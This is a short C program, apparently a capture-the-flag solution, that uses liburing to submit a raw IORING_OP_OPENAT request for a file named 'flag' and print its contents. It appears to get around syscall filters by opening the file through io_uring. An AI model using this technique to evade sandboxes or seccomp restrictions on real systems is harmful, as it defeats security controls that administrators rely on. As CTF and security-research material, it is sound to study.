#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <liburing.h>

int main()
{
	struct io_uring ring;

    // setup submission / completion queues
	io_uring_queue_init(1, &ring, 0);

    // get submission queue
	struct io_uring_sqe *sqe = io_uring_get_sqe(&ring);
	printf("sqe opcode = %d\n", sqe->opcode);
	sqe->opcode = IORING_OP_OPENAT;
	sqe->fd = -100;
	sqe->addr = "flag";
	sqe->open_flags = 0;
	sqe->len = 0;
	io_uring_submit(&ring);

    // wait for completion
	struct io_uring_cqe *cqe;
	int ret = io_uring_wait_cqe(&ring, &cqe);
	printf("ret is %d\n", cqe->res);

    // read fd
	char buf[0x1000];
	read(cqe->res, buf, 0x1000);
	write(1, buf, strlen(buf));
}
